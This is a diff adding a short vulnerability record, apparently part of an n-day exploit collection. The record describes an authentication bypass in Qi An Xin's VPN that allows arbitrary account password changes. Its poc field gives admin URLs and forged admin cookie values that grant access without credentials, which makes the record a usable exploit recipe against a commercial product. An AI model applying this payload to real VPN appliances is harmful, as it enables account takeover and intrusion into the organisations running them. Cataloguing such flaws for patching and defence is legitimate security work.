@@ -1,0 +1,7 @@
+vendor = "奇安信"
+name = "奇安信vpn存在任意账号密码修改"
+type = "认证绕过"
+source = "DVB、TG"
+date = "08.08"
+poc = "https://x.xxx.xxx.cn/admin/group/xgroupphp?id=1 https://x.xxx.xxx.cn/admin/group/xgroupphp?id=3 cookie: admin id=1; gw admin ticket=1;"
+label = "nday"
